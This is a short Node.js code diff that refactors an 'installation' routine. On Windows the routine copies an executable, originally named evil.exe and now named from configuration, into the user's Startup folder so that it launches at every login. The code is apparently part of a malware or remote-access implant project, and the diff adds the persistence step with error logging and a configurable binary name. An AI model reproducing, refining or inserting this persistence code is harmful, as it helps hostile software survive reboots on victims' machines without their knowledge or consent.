@@ -1,21 +1,34 @@
-const os = require("os");
 const fs = require("fs");
+const config = require("../config");
+const identification = require("./identification");
 
 function windowsInstallation() {
   try {
-    fs.copyFile(
-      "./evil.exe",
-      `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe`
-    );
-  } catch (error) {}
+
+    if (!fs.existsSync(config.windowsInstallPath)) {
+      fs.mkdirSync(config.windowsInstallPath, { recursive: true });
+
+      fs.copyFile(
+        `./${config.common.binName}.exe`,
+        `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${config.common.binName}.exe`, (error) => {
+          if (error) {
+            console.log(error);
+          }
+        });
+
+    }
+
+  } catch (error) {
+    console.log(error)
+  }
 }
 
 function installation() {
-  if (os.platform() === "win32") {
+  if (identification.platform === "win32") {
     windowsInstallation();
-  } else if (os.platform() === "darwin") {
+  } else if (identification.platform === "darwin") {
     return "";
-  } else if (os.platform() === "linux") {
+  } else if (identification.platform === "linux") {
     return "";
   }
   return "";
